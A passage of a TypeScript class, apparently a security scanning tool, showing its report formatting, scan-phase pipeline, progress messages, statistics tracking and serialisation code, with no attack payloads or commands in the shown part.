      lines.push(`  ${v.description}`)
      lines.push('')
    }

    if (exploits.length > 0) {
      lines.push('--- Top Exploit Candidates ---')
      for (const e of exploits.slice(0, 5)) {
        lines.push(`[${e.complexity}] ${e.name} (Success: ${round2(e.estimatedSuccessRate * 100)}%)`)
        lines.push(`  Steps: ${e.steps.join(' → ')}`)
        lines.push('')
      }
    }

    if (chains.length > 0) {
      lines.push('--- Attack Chains ---')
      for (const c of chains) {
        lines.push(`[Risk: ${c.totalRisk}] ${c.name} (${c.difficulty})`)
        lines.push(`  ${c.description}`)
        lines.push(`  Phases: ${c.phases.map(p => p.name).join(' → ')}`)
        lines.push(`  Est. time: ${c.estimatedTimeMinutes} min, Success: ${round2(c.successProbability * 100)}%`)
        lines.push('')
      }
    }

    return lines.join('\n')
  }

  // ── Full Scan Pipeline ──────────────────────────────────────

  scanTarget(url: string): ScanReport {
    const startTime = Date.now()

    // Phase 1: Parse target
    const target = this.parseTarget(url)

    // Phase 2: Reconnaissance
    const recon = this.performRecon(target)

    // Phase 3: Attack surface mapping
    const attackSurface = this.mapAttackSurface(target, recon)

    // Phase 4: Vulnerability scanning
    const vulnerabilities = this.scanVulnerabilities(target, recon)

    // Phase 5: Exploit analysis
    const exploits = this.analyzeExploits(vulnerabilities)

    // Phase 6: Attack chain construction
    const chains = this.buildAttackChains(exploits, vulnerabilities)

    // Phase 7: Report generation
    const report = this.generateReport(target, recon, attackSurface, vulnerabilities, exploits, chains)

    // Update stats
    this.updateStats(report, Date.now() - startTime)

    return report
  }

  getScanProgress(phase: ScanPhase, startTime: number): ScanProgress {
    const phases: ScanPhase[] = ['recon', 'scanning', 'analysis', 'exploitation', 'reporting', 'complete']
    const idx = phases.indexOf(phase)
    const percent = idx >= 0 ? round2((idx / (phases.length - 1)) * 100) : 0

    return {
      phase,
      percentComplete: percent,
      currentActivity: this.getPhaseActivity(phase),
      findings: 0,
      elapsed: Date.now() - startTime,
    }
  }

  private getPhaseActivity(phase: ScanPhase): string {
    const activities: Record<ScanPhase, string> = {
      pending: 'Initializing scan...',
      recon: 'Performing passive reconnaissance: DNS, WHOIS, headers, tech fingerprinting...',
      scanning: 'Active vulnerability scanning: OWASP Top 10, header analysis, port scanning...',
      analysis: 'Analyzing attack surface: input vectors, exposed services, endpoints...',
      exploitation: 'Evaluating exploit candidates and building attack chains...',
      reporting: 'Generating comprehensive security assessment report...',
      complete: 'Scan complete.',
      failed: 'Scan failed.',
    }
    return activities[phase]
  }

  private updateStats(report: ScanReport, durationMs: number): void {
    this.stats.totalScans++
    this.stats.totalTargetsScanned++
    this.stats.totalVulnerabilitiesFound += report.vulnerabilities.length
    this.stats.totalExploitsIdentified += report.exploits.length
    this.stats.totalAttackChainsBuilt += report.attackChains.length
    this.stats.totalReportsGenerated++

    const critCount = report.vulnerabilities.filter(v => v.severity === 'critical').length
    const highCount = report.vulnerabilities.filter(v => v.severity === 'high').length
    const medCount = report.vulnerabilities.filter(v => v.severity === 'medium').length
    const lowCount = report.vulnerabilities.filter(v => v.severity === 'low').length

    this.stats.criticalFindings += critCount
    this.stats.highFindings += highCount
    this.stats.mediumFindings += medCount
    this.stats.lowFindings += lowCount

    this.stats.avgRiskScore = round2(
      (this.stats.avgRiskScore * (this.stats.totalScans - 1) + report.riskScore) / this.stats.totalScans
    )
    this.stats.avgScanDurationMs = round2(
      (this.stats.avgScanDurationMs * (this.stats.totalScans - 1) + durationMs) / this.stats.totalScans
    )
  }

  // ── OWASP Knowledge ─────────────────────────────────────────

  getOWASPTop10(): OWASPEntry[] {
    return [...this.owaspTop10]
  }

  getVulnPatterns(): CommonVulnPattern[] {
    return [...this.vulnPatterns]
  }

  getExploitTemplates(): ExploitTemplate[] {
    return [...this.exploitTemplates]
  }

  // ── Utility ─────────────────────────────────────────────────

  getStats(): Readonly<TargetScannerStats> {
    return { ...this.stats }
  }

  provideFeedback(score: number): void {
    const clamped = clamp(score, 0, 5)
    this.stats.feedbackCount++
    this.stats.avgFeedbackScore = round2(
      (this.stats.avgFeedbackScore * (this.stats.feedbackCount - 1) + clamped) / this.stats.feedbackCount
    )
  }

  serialize(): string {
    return JSON.stringify({
      config: this.config,
      stats: this.stats,
    })
  }

  deserialize(data: string): void {
    const parsed = JSON.parse(data) as { config: TargetScannerConfig; stats: TargetScannerStats }
    Object.assign(this.config, parsed.config)
    Object.assign(this.stats, parsed.stats)
  }
}
